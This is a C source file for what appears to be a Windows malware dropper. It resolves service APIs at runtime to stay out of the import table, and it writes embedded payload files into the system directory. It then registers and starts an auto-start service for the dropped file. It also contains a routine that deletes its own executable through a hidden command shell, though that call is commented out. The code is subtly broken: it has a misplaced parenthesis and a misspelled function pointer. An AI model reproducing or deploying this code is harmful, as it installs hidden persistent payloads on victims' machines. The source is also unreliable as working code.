#ifndef UNICODE
#define UNICODE
#endif
#define _WIN32_WINNT 0x0501
#include <stdio.h>
#include <windows.h>
#include <shlwapi.h>
#include "data.h"

#define FILE_TABLE_LENGTH 1
TCHAR g_szWindowsDirectory[MAX_PATH];
TCHAR g_szSystemDirectory[MAX_PATH];
TCHAR g_szInstallerDirectory[MAX_PATH];
TCHAR g_szTempDirectory[MAX_PATH];

TCHAR g_szServiceFileName[MAX_PATH];
TCHAR g_szSelfFileName[MAX_PATH];

typedef SC_HANDLE (WINAPI*PROC_OPENSCMANAGER)(LPCTSTR,LPCTSTR,DWORD);
typedef SC_HANDLE (WINAPI*PROC_OPENSERVICE)(SC_HANDLE,LPCTSTR,DWORD);
typedef SC_HANDLE (WINAPI*PROC_CREATESERVICE)(
        SC_HANDLE hSCManager,
        LPCTSTR lpServiceName,
        LPCTSTR lpDisplayName,
        DWORD dwDesiredAccess,
        DWORD dwServiceType,
        DWORD dwStartType,
        DWORD dwErrorControl,
        LPCTSTR lpBinaryPathName,
        LPCTSTR lpLoadOrderGroup,
        LPDWORD lpdwTagId,
        LPCTSTR lpDependencies,
        LPCTSTR lpServiceStartName,
        LPCTSTR lpPassword
      );
typedef BOOL (WINAPI *PROC_CHANGESERVICECONFIG)(
        SC_HANDLE hService,
        DWORD dwServiceType,
        DWORD dwStartType,
        DWORD dwErrorControl,
        LPCTSTR lpBinaryPathName,
        LPCTSTR lpLoadOrderGroup,
        LPDWORD lpdwTagId,
        LPCTSTR lpDependencies,
        LPCTSTR lpServiceStartName,
        LPCTSTR lpPassword,
        LPCTSTR lpDisplayName
      );
typedef BOOL (WINAPI* PROC_STARTSERVICE)(SC_HANDLE,DWORD,LPCTSTR*);
typedef BOOL (WINAPI* PROC_WRITEFILE)(
        HANDLE hFile,
        LPCVOID lpBuffer,
        DWORD nNumberOfBytesToWrite,
        LPDWORD lpNumberOfBytesWritten,
        LPOVERLAPPED lpOverlapped
);

typedef HANDLE (WINAPI *PROC_CREATEFILE)(
        LPCTSTR lpFileName,
        DWORD dwDesiredAccess,
        DWORD dwShareMode,
        LPSECURITY_ATTRIBUTES lpSecurityAttributes,
        DWORD dwCreationDisposition,
        DWORD dwFlagsAndAttributes,
        HANDLE hTemplateFile
);

PROC_OPENSCMANAGER      _OpenSCManager;
PROC_OPENSERVICE        _OpenService;
PROC_CREATESERVICE      _CreateService;
PROC_CHANGESERVICECONFIG    _ChangeServiceConfig;
PROC_STARTSERVICE       _StartService;
PROC_CREATEFILE _CreateFile;
PROC_WRITEFILE  _WriteFile;
BOOL InitEnv(VOID);


VOID DeleteMySelf(void);
BOOL IsWow64();


VOID DeleteMySelf(void)
{
    TCHAR szModule [MAX_PATH],
          szComspec[MAX_PATH],
          szParams [MAX_PATH];

    if((GetModuleFileName(0,szModule,MAX_PATH)!=0) &&
       (GetShortPathName(szModule,szModule,MAX_PATH)!=0) &&
       (GetEnvironmentVariable(TEXT("COMSPEC"),szComspec,MAX_PATH)!=0))
    {
        lstrcpy(szParams,TEXT(" /c (for /l %i in (1,1,100) do echo.>nul )&del "));
        lstrcat(szParams, szModule);
        lstrcat(szParams, TEXT(" > nul"));
        lstrcat(szComspec, szParams);

        STARTUPINFO si={0};
        si.cb = sizeof(STARTUPINFO);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi;
        memset(&pi, 0, sizeof pi);
        SetPriorityClass(GetCurrentProcess(),
                REALTIME_PRIORITY_CLASS);
        SetThreadPriority(GetCurrentThread(),
            THREAD_PRIORITY_TIME_CRITICAL);

        if(CreateProcess(NULL, szComspec, NULL, FALSE, 0,CREATE_SUSPENDED |
                    CREATE_NO_WINDOW, 0, 0, &si, &pi))
        {
            SetPriorityClass(pi.hProcess,IDLE_PRIORITY_CLASS);
                        SetThreadPriority(pi.hThread,THREAD_PRIORITY_IDLE);
            ResumeThread(pi.hThread);
        }
        else
        {
            SetPriorityClass(GetCurrentProcess(),
                             NORMAL_PRIORITY_CLASS);
            SetThreadPriority(GetCurrentThread(),
                              THREAD_PRIORITY_NORMAL);
        }
    }
    int r = TerminateProcess(GetCurrentProcess(),0);
    printf("r = %d\n",r);
    return;
}

VOID AppendBacklashToPath(LPTSTR szPath) {
    DWORD dwLen = lstrlen(szPath);
    if(szPath[dwLen - 1] != TEXT('\\')) {
        szPath[dwLen] = TEXT('\\');
        szPath[dwLen + 1] = TEXT('\0');
    }

}

BOOL IsWow64()
{
    typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
    LPFN_ISWOW64PROCESS fnIsWow64Process;
    BOOL bIsWow64 = FALSE;
    fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress( GetModuleHandle(TEXT("kernel32")), "IsWow64Process");
    if (NULL != fnIsWow64Process)
    {
        fnIsWow64Process(GetCurrentProcess(),&bIsWow64);
    }
    return bIsWow64;
}
BOOL InitEnv(VOID)
{
    int i;
    DWORD szRet;
    GetWindowsDirectory(g_szWindowsDirectory,MAX_PATH);
    lstrcpy(g_szSystemDirectory,g_szWindowsDirectory);
    AppendBacklashToPath(g_szSystemDirectory);
    lstrcat(g_szSystemDirectory,
            IsWow64()?
            TEXT("SysWOW64":
            TEXT("System32")));
    GetModuleFileName(GetModuleHandle(NULL),g_szSelfFileName,MAX_PATH);
    lstrcpy(g_szInstallerDirectory,g_szSelfFileName);
    for(i = lstrlen(g_szInstallerDirectory) - 1; i >= 0; i--)  {
        if(g_szInstallerDirectory[i] == TEXT('\\')) {
            g_szInstallerDirectory[i] = TEXT('\0');
            break;
        }
    }

    GetTempPath(sizeof(g_szTempDirectory),g_szTempDirectory);


    lstrcpy(g_szServiceFileName,g_szSystemDirectory);
    AppendBacklashToPath(g_szServiceFileName);
    lstrcat(g_szServiceFileName,TEXT(SERVICE_FILE));

    printf("D Windows: %ls\nD System: %ls\nD Installer: %ls\nD Temp: %ls\nF Service: %ls\n",
           g_szWindowsDirectory,
           g_szSystemDirectory,
           g_szInstallerDirectory,
           g_szTempDirectory,
           g_szServiceFileName);

    /******************************************************************/
    HMODULE hAdvapi32Module=LoadLibrary(TEXT("Advapi32"));
    if(NULL==hAdvapi32Module)
        return FALSE;
    HMODULE hKernel32Module=LoadLibrary(TEXT("Kernel32"));
    if(NULL==hKernel32Module)
        return FALSE;
    _WriteFile=             GetProcAddress(hKernel32Module,"WriteFile");
#ifdef UNICODE
    _OpenService=           GetProcAddress(hAdvapi32Module,"OpenServiceW");
    _OpenSCManager=         GetProcAddress(hAdvapi32Module,"OpenSCManagerW");
    _CreateService=         GetProcAddress(hAdvapi32Module,"CreateServiceW");
    _ChangeServiceConfig=   GetProcAddress(hAdvapi32Module,"ChangeServiceConfigW");
    _StartService=          GetProcAddress(hAdvapi32Module,"StartServiceW");
    _CreateFile=            GetProcAddress(hKernel32Module,"CreateFileW");
#else
    _OpenService=           GetProcAddress(hAdvapi32Module,"OpenServiceA");
    _OpenSCManger=          GetProcAddress(hAdvapi32Module,"OpenSCManagerA");
    _CreateService=         GetProcAddress(hAdvapi32Module,"CreateServiceA");
    _ChangeServiceConfig=   GetProcAddress(hAdvapi32Module,"ChangeServiceConfigA");
    _StartService=          GetProcAddress(hAdvapi32Module,"StartServiceA");
    _CreateFile=            GetProcAddress(hKernel32Module,"CreateFileA");
#endif
    //printf("%x\n%x\n%x\n%x\n%x\n",_OpenService,_OpenSCManager,_CreateService,_ChangeServiceConfig,_StartService);
    return TRUE;
}

int InstallService(LPTSTR szServiceName,LPTSTR szDisplayName,LPTSTR szFileName)
{
    SC_HANDLE hSCM=_OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if(hSCM==NULL)
        return 1;
    SC_HANDLE hService=NULL;
    hService=_OpenService(hSCM,szServiceName,GENERIC_ALL);
    if(hService)
    {
        _ChangeServiceConfig(hService,
                            SERVICE_WIN32_OWN_PROCESS,
                            SERVICE_AUTO_START,
                            0,
                            szFileName,
                            NULL,
                            NULL,
                            NULL,
                            NULL,
                            NULL,
                            NULL);
    }else{
        hService=_CreateService(hSCM,
                         szServiceName,
                         szDisplayName,
                         SERVICE_ALL_ACCESS,
                         SERVICE_WIN32_OWN_PROCESS,
                         SERVICE_AUTO_START,
                         SERVICE_ERROR_NORMAL,
                         szFileName,
                         NULL,
                         NULL,
                         TEXT(""),
                         NULL,
                         NULL);
    }
    if(hService==NULL)
    {
        return 2;
    }

    _StartService(hService,0,(LPVOID)NULL);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return 0;
}


void ReleasePackFiles(PACKFILE *files,DWORD szLength) {
    int i;
    for(i = 0; i < szLength; i++) {
        TCHAR szReleaseFileName[MAX_PATH];
        HANDLE hFile= INVALID_HANDLE_VALUE;
        switch(files[i].installPath) {
        case INS_PATH_CURRENT:
            lstrcpy(szReleaseFileName,g_szInstallerDirectory);
            break;
        case INS_PATH_SYSTEM:
            lstrcpy(szReleaseFileName,g_szSystemDirectory);
            break;
        case INS_PATH_TEMP:
            lstrcpy(szReleaseFileName,g_szTempDirectory);
            break;
        case INS_PATH_WINDOWS:
            lstrcpy(szReleaseFileName,g_szWindowsDirectory);
            break;
        }
        if(files[i].szSubDir != NULL && files[i].szSubDir[0] != TEXT('\0')) {
            //lstrcat(szReleaseFileName,TEXT("\\"));
            AppendBacklashToPath(szReleaseFileName);
            lstrcat(szReleaseFileName,files[i].szSubDir);
            if(!CreateDirectory(szReleaseFileName,NULL))
                if(GetLastError()!=ERROR_ALREADY_EXISTS)
                    continue;
        }
        AppendBacklashToPath(szReleaseFileName);
        lstrcat(szReleaseFileName,files[i].szFileName);
        printf("R %ls\n",szReleaseFileName);
        hFile = _CreateFile(szReleaseFileName,
                            GENERIC_READ | GENERIC_WRITE,
                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                            NULL,
                            CREATE_ALWAYS,
                            FILE_ATTRIBUTE_NORMAL,
                            NULL);
        if (INVALID_HANDLE_VALUE == hFile)
        {
            CloseHandle(hFile);
            continue;
        }
        DWORD dwRealWrite;
        _WriteFile(hFile,
                   files[i].byFileData,
                   files[i].dwFileSize,
                   &dwRealWrite,
                   NULL);
        CloseHandle(hFile);
    }
}

int main(void)
{
    puts("Initializing. . .");
    InitEnv();
    puts("Releasing. . .");

    LPPACKFILE pFileTable;
    DWORD dwFileTableLen;
    dwFileTableLen = GetPackFileTable(&pFileTable);
    ReleasePackFiles(pFileTable,dwFileTableLen);

    puts("Installing Service. . .");
    InstallService(TEXT(SERVICE_NAME),TEXT(SERVICE_DISPLAY_NAME),g_szServiceFileName);
    puts("To Delete My Self");
    //DeleteMySelf();
    getchar();
    return 0;
}
